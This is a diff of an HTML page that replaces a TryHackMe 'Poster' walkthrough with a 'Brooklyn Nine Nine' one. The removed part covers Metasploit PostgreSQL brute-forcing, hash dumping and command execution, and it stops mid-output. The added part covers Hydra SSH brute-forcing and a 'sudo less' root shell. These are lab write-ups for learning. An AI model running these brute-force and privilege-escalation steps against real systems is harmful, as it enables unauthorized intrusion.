@@ -13,7 +13,7 @@
 <div class="favicon">
     <img src="/img/favicon.ico" alt="Imagine">
 </div>
-<h1>LumiryX - Portfolio</h1>
+<h1>LumiryX - Brooklyn 99</h1>
 <div class="header-controls">
 <button onclick="toggleTheme()">🌙</button>
 </div>
@@ -60,215 +60,174 @@
 <!-- MAIN CONTENT -->
 <main class="main-content">
 
-<h1 id="note-">Note:</h1>
-<p>Answers are censored. Sorry for that, but I want to make it online on TryHackMe. &gt; However, if you follow the steps, you should be able to find it on your own. It feels even better<code>;)</code></p>
-<h1 id="mission">Mission</h1>
-<h2 id="intro">Intro</h2>
-<p><em>What is rdbms?  
-</em></p>
-<p>Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.
-Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.
-Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.</p>
-<h2 id="questions-">Questions:</h2>
-<ol>
-<li>What is the rdbms installed on the server?</li>
-<li>What port is the rdbms running on?</li>
-<li>Nothing</li>
-<li>After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?</li>
-<li>What are the credentials you found?  </li>
-<li>What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?</li>
-<li>Based on the results of #6, what is the rdbms version installed on the server?</li>
-<li>What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?</li>
-<li>How many user hashes does the module dump?</li>
-<li>What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?</li>
-<li>What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?</li>
-<li>Compromise the machine and locate user.txt</li>
-<li>Escalate privileges and obtain root.txt</li>
-</ol>
+    <h1 id="mission">Mission</h1>
+<ul>
+<li>Obtain User Flag</li>
+<li>Obtain Root Flag</li>
+</ul>
 <h1 id="setup">Setup</h1>
-<p>Add target machine IP address into /etc/hosts</p>
-<pre><code>10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.166</span><span class="hljs-selector-class">.118</span>  <span class="hljs-selector-tag">poster</span><span class="hljs-selector-class">.thm</span>
-</code></pre><h1 id="nmap">Nmap</h1>
-<h3 id="1-2-from-our-nmap-scan-we-can-answer-our-first-and-second-question-">1,2.From our nmap scan, we can answer our first and second Question.</h3>
+<p>For easier access during enumeration, we add the target machine’s IP address to the <code>/etc/hosts</code> file.</p>
+<pre><code>&gt; sudo nano /etc/hosts
+
+<span class="hljs-number">10.114</span><span class="hljs-number">.130</span><span class="hljs-number">.2</span>   brooklyn.thm
+</code></pre><h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
 <p>TCP</p>
-<pre><code>&gt; sudo nmap -sC -sV -p- poster.thm -T5
+<pre><code>&gt; <span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">brooklyn</span><span class="hljs-selector-class">.thm</span> <span class="hljs-selector-tag">-T5</span>
+<span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.98</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2026-03-10 05:54 -0500</span>
+Nmap scan report for brooklyn.thm (<span class="hljs-number">10.114</span>.<span class="hljs-number">130.2</span>)
+Host is up (<span class="hljs-number">0.040s</span> latency).
+Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">997</span> closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">21</span>/tcp open  ftp     vsftpd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span>
+| <span class="hljs-attribute">ftp-anon</span>: Anonymous FTP login allowed (FTP code <span class="hljs-number">230</span>)
+|_-rw-r--r--    <span class="hljs-number">1</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>             <span class="hljs-number">119</span> May <span class="hljs-number">17</span>  <span class="hljs-number">2020</span> note_to_jake.txt
+| <span class="hljs-attribute">ftp-syst</span>: 
+|   <span class="hljs-attribute">STAT</span>: 
+| FTP server <span class="hljs-attribute">status</span>:
+|      Connected <span class="hljs-attribute">to </span>::<span class="hljs-attribute">ffff</span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">154.100</span>
+|      Logged in as ftp
+|      <span class="hljs-attribute">TYPE</span>: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span class="hljs-number">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was <span class="hljs-number">1</span>
+|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable
+|_End of status
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-attribute">ssh-hostkey</span>: 
+|   <span class="hljs-number">2048</span> <span class="hljs-number">16</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">ba</span>:<span class="hljs-number">98</span>:<span class="hljs-number">77</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">b6</span>:<span class="hljs-number">25</span>:<span class="hljs-number">72</span>:<span class="hljs-attribute">c6</span>:a3 (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">3</span><span class="hljs-attribute">b</span>:<span class="hljs-number">61</span>:<span class="hljs-number">59</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c4</span>:<span class="hljs-number">29</span>:<span class="hljs-attribute">b5</span>:<span class="hljs-attribute">e8</span>:<span class="hljs-number">58</span>:<span class="hljs-number">39</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">e9</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:ee (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-attribute">ab</span>:<span class="hljs-number">16</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">79</span>:<span class="hljs-number">20</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">01</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-number">8</span><span class="hljs-attribute">c</span>:<span class="hljs-number">44</span>:<span class="hljs-number">26</span>:<span class="hljs-number">01</span>:<span class="hljs-number">58</span>:<span class="hljs-number">04</span> (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> ((Ubuntu))
+|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">29</span> (Ubuntu)
+|<span class="hljs-attribute">_http-title</span>: Site doesn't have a title (text/html).
+Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OSs</span>: Unix, Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel
 
-PORT     STATE SERVICE    VERSION
-<span class="hljs-number">22</span>/tcp   open  ssh        OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.10</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
-| ssh-<span class="hljs-string">hostkey:</span> 
-|   <span class="hljs-number">2048</span> <span class="hljs-number">71</span>:<span class="hljs-string">ed:</span><span class="hljs-number">48</span>:<span class="hljs-string">af:</span><span class="hljs-number">29</span>:<span class="hljs-number">9</span><span class="hljs-string">e:</span><span class="hljs-number">30</span>:<span class="hljs-string">c1:</span><span class="hljs-string">b6:</span><span class="hljs-number">1</span><span class="hljs-string">d:</span><span class="hljs-string">ff:</span><span class="hljs-string">b0:</span><span class="hljs-number">24</span>:<span class="hljs-string">cc:</span><span class="hljs-number">6</span><span class="hljs-string">d:</span>cb (RSA)
-|   <span class="hljs-number">256</span> <span class="hljs-string">eb:</span><span class="hljs-number">3</span><span class="hljs-string">a:</span><span class="hljs-string">a3:</span><span class="hljs-number">4</span><span class="hljs-string">e:</span><span class="hljs-number">6</span><span class="hljs-string">f:</span><span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-string">ab:</span><span class="hljs-string">ef:</span><span class="hljs-string">fc:</span><span class="hljs-string">c5:</span><span class="hljs-number">2</span><span class="hljs-string">b:</span><span class="hljs-number">0</span><span class="hljs-string">e:</span><span class="hljs-string">db:</span><span class="hljs-number">40</span>:<span class="hljs-number">57</span> (ECDSA)
-|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-number">41</span>:<span class="hljs-number">42</span>:<span class="hljs-number">35</span>:<span class="hljs-number">38</span>:<span class="hljs-number">05</span>:<span class="hljs-string">d3:</span><span class="hljs-number">92</span>:<span class="hljs-string">eb:</span><span class="hljs-number">49</span>:<span class="hljs-number">39</span>:<span class="hljs-string">c6:</span><span class="hljs-string">e3:</span><span class="hljs-string">ee:</span><span class="hljs-number">78</span>:de (ED25519)
-<span class="hljs-number">80</span>/tcp   open  http       Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))
-|_http-<span class="hljs-string">title:</span> Poster CMS
-|_http-server-<span class="hljs-string">header:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)
-<span class="hljs-number">543</span>*/tcp open  postgresql ***SQL DB <span class="hljs-number">9.5</span><span class="hljs-number">.8</span> - <span class="hljs-number">9.5</span><span class="hljs-number">.10</span> or <span class="hljs-number">9.5</span><span class="hljs-number">.17</span> - <span class="hljs-number">9.5</span><span class="hljs-number">.23</span>
-| ssl-<span class="hljs-string">cert:</span> <span class="hljs-string">Subject:</span> commonName=ubuntu
-| Not valid <span class="hljs-string">before:</span> <span class="hljs-number">2020</span><span class="hljs-number">-07</span><span class="hljs-number">-29</span><span class="hljs-string">T00:</span><span class="hljs-number">54</span>:<span class="hljs-number">25</span>
-|_Not valid <span class="hljs-string">after:</span>  <span class="hljs-number">2030</span><span class="hljs-number">-07</span><span class="hljs-number">-27</span><span class="hljs-string">T00:</span><span class="hljs-number">54</span>:<span class="hljs-number">25</span>
-|_ssl-<span class="hljs-string">date:</span> TLS randomness does not represent time
-Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Linux; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">linux:</span>linux_kernel
-</code></pre><p>UDP</p>
-<pre><code>&gt; sudo nmap -sU --top-ports 100 poster.thm -T5
+Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span>
+Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">11.96</span> seconds
+</code></pre><p>Open Ports: 21, 22, 80</p>
+<p>UDP</p>
+<pre><code>&gt; sudo nmap -sU -sV <span class="hljs-comment">--top-ports 200 brooklyn.thm</span>
+[sudo] password <span class="hljs-keyword">for</span> sh13ld: 
+Starting Nmap <span class="hljs-number">7.98</span> ( https://nmap.org ) at <span class="hljs-number">2026</span>-<span class="hljs-number">03</span>-<span class="hljs-number">10</span> <span class="hljs-number">05</span>:<span class="hljs-number">55</span> -<span class="hljs-number">0500</span>
+Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> brooklyn.thm (<span class="hljs-number">10.114</span>.<span class="hljs-number">130.2</span>)
+Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.041</span>s latency).
+<span class="hljs-keyword">Not</span> shown: <span class="hljs-number">199</span> closed udp ports (<span class="hljs-keyword">port</span>-unreach)
+<span class="hljs-keyword">PORT</span>   STATE         SERVICE VERSION
+<span class="hljs-number">68</span>/udp <span class="hljs-keyword">open</span>|filtered dhcpc
 
-Top 100 UDP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">closed</span>.
-</code></pre><hr>
-<h3 id="3-no-need-answer">3.No need answer</h3>
-<hr>
-<h3 id="4-we-found-the-useful-path-for-our-purpose-">4.We found the useful path for our purpose:</h3>
-<h1 id="metasploit">Metasploit</h1>
-<p>As the question telling us. We should look at the metasploit.
-<code>After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?</code></p>
-<p>As we know we can start metasploit framework with this command:
-<code>msfconsole</code></p>
-<p>Also i recommend this webpage: <a href="https://docs.metasploit.com/docs/pentesting/metasploit-guide-postgresql.html">https://docs.metasploit.com/docs/pentesting/metasploit-guide-postgresql.html</a>. You can find there multiple answer which we are looking for in this room. </p>
-<pre><code>msf &gt; <span class="hljs-keyword">use</span> auxiliary/scanner/postgres<span class="hljs-comment">/****</span>
-</code></pre><hr>
-<h3 id="5-after-the-bruteforcing-credentials-with-metasploit-you-should-be-able-to-answer-this-question">5. After the bruteforcing credentials with metasploit you should be able to answer this question</h3>
-<p>After we selected our payload which we want to run we have to configure it before it.
-For this purpose just type: <code>show options</code>.</p>
-<p>We have to use wordlists for crack the credentials.
-If you are on <code>kali linux</code> you can find these wordlists in this directory <code>/usr/share/wordlists/metasploit</code></p>
-<pre><code><span class="hljs-keyword">SET</span> RHOSTS <span class="hljs-comment">[target ip]</span>
-<span class="hljs-keyword">set</span> <span class="hljs-comment">USER_FILE</span> /usr/<span class="hljs-comment">share</span>/wordlists/<span class="hljs-comment">metasploit</span>/postgres_default_user.txt
-set PASS_FILE /<span class="hljs-comment">usr</span>/share/<span class="hljs-comment">wordlists</span>/metasploit/<span class="hljs-comment">postgres_default_pass.txt</span>
-<span class="hljs-keyword">set</span> <span class="hljs-comment">THREADS 50</span>
-</code></pre><p>Or we can run this command: <code>msf auxiliary(scanner/postgres/postgres_login) &gt; run postgres://[target ip] threads=50 user_file=/usr/share/wordlists/metasploit/postgres_default_user.txt pass_file=/usr/share/wordlists/metasploit/postgres_default_pass.txt</code> </p>
-<p>If you setted up correctly then you just need to wait few second and you should be able to gain the credentails.</p>
-<pre><code><span class="hljs-selector-attr">[+]</span> 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.166</span><span class="hljs-selector-class">.118</span><span class="hljs-selector-pseudo">:5432</span>   <span class="hljs-selector-tag">-</span> 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.166</span><span class="hljs-selector-class">.118</span><span class="hljs-selector-pseudo">:5432</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Login</span> <span class="hljs-selector-tag">Successful</span>: <span class="hljs-selector-tag">pos</span>**<span class="hljs-selector-pseudo">:pa</span>***@<span class="hljs-keyword">template1</span>
-</code></pre><hr>
-<h3 id="6-check-the-url-which-i-mention-earlier-and-you-should-be-able-to-find-it">6. Check the URL which I mention earlier and you should be able to find it</h3>
-<hr>
-<h3 id="7-this-command-will-show-you-the-version-of-sql-which-is-running-on-the-device-">7. This command will show you the version of sql which is running on the device.</h3>
-<p>Use the payload which we found earlier and log in with credentials which we obtain earlier.</p>
-<pre><code><span class="hljs-keyword">use</span> auxiliary/admin/postgres/***
-run <span class="hljs-symbol">'postgres</span>://user:this <span class="hljs-keyword">is</span> my password@<span class="hljs-number">192.168</span>.<span class="hljs-number">1.123</span>/database_name' sql=<span class="hljs-symbol">'select</span> version()'
-</code></pre><hr>
-<h3 id="8-check-the-url-above-to-answer-this-question">8. Check the URL above to answer this question</h3>
-<pre><code>auxiliary<span class="hljs-regexp">/scanner/</span>postgres<span class="hljs-regexp">/postgres_h****</span>
-</code></pre><hr>
-<h3 id="9-this-gonna-show-you-how-much-hashes-are-dump">9. This gonna show you how much hashes are dump</h3>
-<p>You can find it on the site which i mention earlier.</p>
-<pre><code>auxiliary<span class="hljs-regexp">/scanner/</span>postgres<span class="hljs-regexp">/postgres_***</span>
-</code></pre><pre><code>msf auxiliary(scanner/postgres/postgres_****) &gt; run postgres://pos***:pas***@<span class="hljs-number">10.129.166.118</span>
-<span class="hljs-string">[+]</span> <span class="hljs-number">10.129.166.118:5432</span> - Query appears to have run successfully
-<span class="hljs-string">[+]</span> <span class="hljs-number">10.129.166.118:5432</span> - Postgres Server Hashes
-======================
+Service detection performed. Please <span class="hljs-keyword">report</span> any incorrect results at https://nmap.org/submit/ .
+Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">307.60</span> seconds
+</code></pre><p>Open/Filtered Port: 68</p>
+<ul>
+<li>Not important for us.</li>
+</ul>
+<h1 id="vulnerability-assessment">Vulnerability Assessment</h1>
+<p>During enumeration, it is important to review every open port carefully, especially services that allow authentication without credentials. These often lead to information disclosure or initial access.</p>
+<h3 id="ftp-21-">FTP (21)</h3>
+<p>We can log in as an anonymous user, so this service is investigated first.</p>
+<pre><code><span class="hljs-quote">&gt; ftp brooklyn.thm</span>
+Connected to brooklyn.thm.
+220 (vsFTPd 3.0.3)
+Name (brooklyn.thm:sh13ld): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||53479|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note<span class="hljs-emphasis">_to_</span>jake.txt
+226 Directory send OK.
+ftp&gt; get note<span class="hljs-emphasis">_to_</span>jake.txt
+local: note<span class="hljs-emphasis">_to_</span>jake.txt remote: note<span class="hljs-emphasis">_to_</span>jake.txt
+229 Entering Extended Passive Mode (|||39038|)
+150 Opening BINARY mode data connection for note<span class="hljs-emphasis">_to_</span>jake.txt (119 bytes).
+100% |<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span>|   119      186.23 KiB/s    00:00 ETA
+226 Transfer complete.
+119 bytes received in 00:00 (2.92 KiB/s)
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||16385|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        114          4096 May 17  2020 .
+drwxr-xr-x    2 0        114          4096 May 17  2020 ..
+-rw-r--r--    1 0        0             119 May 17  2020 note<span class="hljs-emphasis">_to_</span>jake.txt
+226 Directory send OK.
+</code></pre><p>We discovered one file on the FTP server. Since files cannot be viewed directly through the FTP interface, we need to download it locally using the <code>get</code> command.</p>
+<h4 id="note_to_jake-txt">Note_to_jake.txt</h4>
+<pre><code>&gt; cat note_to_jake.txt
+From Amy,
 
- Username   Hash
- --------   ----
- darkstart  md58842b99375db43e9fdf238753623a27d
- poster     md578fb805c7412ae597b399844a54cce0a
- postgres   md532e12f215ba27cb750c9e093ce4b51279
- sist***    **************
+Jake please change your password. It is too weak <span class="hljs-keyword">and</span> holt will be mad <span class="hljs-keyword">if</span> someone hacks <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">nine</span> <span class="hljs-literal">nine</span>
+</code></pre><h3 id="ssh-22-">SSH(22)</h3>
+<p>SSH allows password authentication, which means weak credentials could potentially be exploited through a brute-force attack.</p>
+<pre><code>&gt; ssh jake@brooklyn.thm
+The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-symbol">'brooklyn</span>.thm (<span class="hljs-number">10.114</span>.<span class="hljs-number">130.2</span>)' can<span class="hljs-symbol">'t</span> be established.
+ED25519 key fingerprint <span class="hljs-keyword">is</span>: SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU
+This key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> known by any other names.
+Are you sure you want <span class="hljs-keyword">to</span> continue connecting (yes/no/[fingerprint])? yes
+<span class="hljs-literal">Warning</span>: Permanently added <span class="hljs-symbol">'brooklyn</span>.thm' (ED25519) <span class="hljs-keyword">to</span> the list <span class="hljs-keyword">of</span> known hosts.
+** <span class="hljs-literal">WARNING</span>: connection <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> using a post-quantum key exchange algorithm.
+** This session may be vulnerable <span class="hljs-keyword">to</span> <span class="hljs-string">"store now, decrypt later"</span> attacks.
+** The server may need <span class="hljs-keyword">to</span> be upgraded. See https://openssh.com/pq.html
+jake@brooklyn.thm<span class="hljs-symbol">'s</span> password:
+</code></pre><h3 id="http-80-">HTTP(80)</h3>
+<p>The webpage appears mostly empty and only displays an image. However, inspecting the page source reveals a comment mentioning steganography.</p>
+<pre><code>&lt;-- Have you ever heard <span class="hljs-keyword">of</span> steganography? --&gt;
+</code></pre><p>This suggests hidden data inside media files, although in this case it turns out to be a rabbit hole and not required for solving the challenge. <a href="https://www.okta.com/identity-101/steganography/">Read more about Steganography</a> </p>
+<p>Even so, understanding steganography is useful knowledge for future CTF challenges.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Based on the message found in <code>note_to_jake.txt</code>, Jake is using a weak password. This makes a brute-force attack a reasonable next step.</p>
+<p>We know a user named <code>jake</code> exists, so we attempt an SSH login using this account.
+The <code>rockyou.txt</code> wordlist is commonly used in CTF environments because it contains many real-world leaked passwords, making it effective against weak credentials.</p>
+<h2 id="hydra">Hydra</h2>
+<pre><code><span class="hljs-quote">&gt; hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://brooklyn.thm</span>
 
-<span class="hljs-string">[*]</span> Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
-</code></pre><hr>
-<h3 id="10-check-the-link-and-answer-the-question">10.  Check the link and answer the question</h3>
-<p>You should be able to find the answer there
-<a href="https://www.offsec.com/metasploit-unleashed/admin-postgres-auxiliary-modules/">https://www.offsec.com/metasploit-unleashed/admin-postgres-auxiliary-modules/</a></p>
-<pre><code>auxiliary<span class="hljs-regexp">/admin/</span>postgres<span class="hljs-regexp">/postgres_re****</span>
-</code></pre><hr>
-<h3 id="11-visit-the-link-and-you-will-be-able-to-answer-this-question-easily">11.Visit the link and you will be able to answer this question easily</h3>
-<p>This site gonna answer this question:
-<a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5">https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5</a></p>
-<pre><code>exploit<span class="hljs-regexp">/multi/</span>postgres<span class="hljs-regexp">/postgres_copy_from_pr****</span>
-</code></pre><hr>
-<h3 id="12-here-we-should-use-payload-which-we-obtain-earlier-and-configure-few-things">12.  Here we should use payload which we obtain earlier and configure few things</h3>
-<pre><code>msf exploit(multi/postgres/postgres_copy_from_pr***) &gt; show options
+[<span class="hljs-string">22</span>][<span class="hljs-symbol">ssh</span>] host: brooklyn.thm   login: jake   password: <span class="hljs-strong">*****</span>*321
+1 of 1 target successfully completed, 1 valid password found
+</code></pre><p>The password was cracked in about 2 seconds.</p>
+<p>Now we can log in via SSH.</p>
+<pre><code>&gt; <span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">jake</span>@<span class="hljs-keyword">brooklyn</span>.<span class="hljs-keyword">thm</span>
+</code></pre><p>The directory structure suggests that <code>holt</code> is a higher-privileged user, so we check this directory for accessible files.</p>
+<pre><code>jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd ..
+jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
+amy  holt  jake
+jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>cd holt
+jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home/holt</span><span class="hljs-variable">$ </span>ls
+nano.save  user.txt
+jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home/holt</span><span class="hljs-variable">$ </span>cat user.txt
+ee11cbb19052e40b07*******
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>A common first step after gaining user access is running <code>sudo -l</code> to identify commands that can be executed with elevated privileges.</p>
+<pre><code>jake<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home/holt</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> jake on <span class="hljs-symbol">brookly_nine_nine:</span>
+    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>
 
-Module options (exploit/multi/postgres/postgres_copy_from_prog****):
+User jake may run the following commands on <span class="hljs-symbol">brookly_nine_nine:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/less
+</code></pre><p>We are allowed to run <code>/usr/bin/less</code> with sudo privileges.</p>
+<p>There are different options how to gain root as shell from there, but I like to use <a href="https://gtfobins.org/#">GTFObins</a>
+![[Screenshot 2026-03-10 at 14.33.56.jpg]]</p>
+<p>We execute the following command: <code>sudo less /etc/profile</code>
+<code>&gt; jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile</code></p>
+<p>After opening the file, type: <code>!/bin/bash</code> and hit enter.
+You should now see the # symbol, which indicates that we have obtained root privileges. You can also confirm this by running the <code>whoami</code> command.</p>
+<pre><code>root<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home/holt</span><span class="hljs-comment"># whoami</span>
+root
+</code></pre><p>There are also other possible techniques. For example, you could copy <code>/etc/passwd</code> and <code>/etc/shadow</code>, extract the password hashes <a href="https://attack.mitre.org/techniques/T1003/008/">ReadMore</a>, and attempt to crack them. A useful online tool for this is <a href="https://crackstation.net/">crackstation</a>. After cracking the hash, you could log in as root over SSH using the recovered password.</p>
+<h2 id="root-flag">Root Flag</h2>
+<pre><code>root<span class="hljs-variable">@brookly_nine_nine</span><span class="hljs-symbol">:/home/holt</span><span class="hljs-comment"># cat /root/root.txt</span>
+-- Creator : Fsociety2006 --
+Congratulations <span class="hljs-keyword">in</span> rooting Brooklyn Nine Nine
+Here is the <span class="hljs-symbol">flag:</span> <span class="hljs-number">63</span>a9f0ea7bb98050796b6*****
 
-   Name               Current Setting  Required  Description
-   <span class="hljs-comment">----               ---------------  --------  -----------</span>
-   DUMP_TABLE_OUTPUT  <span class="hljs-literal">false</span>            no        select payload <span class="hljs-keyword">command</span> <span class="hljs-title">output</span> <span class="hljs-title">f</span>
-                                                 rom table (For Debugging)
-   TABLENAME          ylXXCzn2         yes       A table name that does <span class="hljs-keyword">not</span> exis
-                                                 t (To avoid deletion)
+Enjoy!!
+</code></pre><h1 id="note-">NOTE:</h1>
+<p>When you get stuck, try researching the issue yourself before checking a writeup. It can take time, but this process significantly improves problem-solving skills and long-term understanding.</p>
 
-
-   Used when connecting via <span class="hljs-keyword">an</span> existing SESSION:
-
-   Name     Current Setting  Required  Description
-   <span class="hljs-comment">----     ---------------  --------  -----------</span>
-   SESSION                   no        The session <span class="hljs-built_in">to</span> run this module <span class="hljs-keyword">on</span>
-
-
-   Used when making <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> connection via RHOSTS:
-
-   Name      Current Setting  Required  Description
-   <span class="hljs-comment">----      ---------------  --------  -----------</span>
-   DATABASE  postgres         no        The database <span class="hljs-built_in">to</span> authenticate against
-   PASSWORD  postgres         no        The password <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> specified username.
-                                         Leave blank <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">random</span> password.
-   RHOSTS                     no        The target host(s), see <span class="hljs-keyword">https</span>://docs.met
-                                        asploit.com/docs/<span class="hljs-keyword">using</span>-metasploit/basics
-                                        /<span class="hljs-keyword">using</span>-metasploit.html
-   RPORT     <span class="hljs-number">5432</span>             no        The target port (TCP)
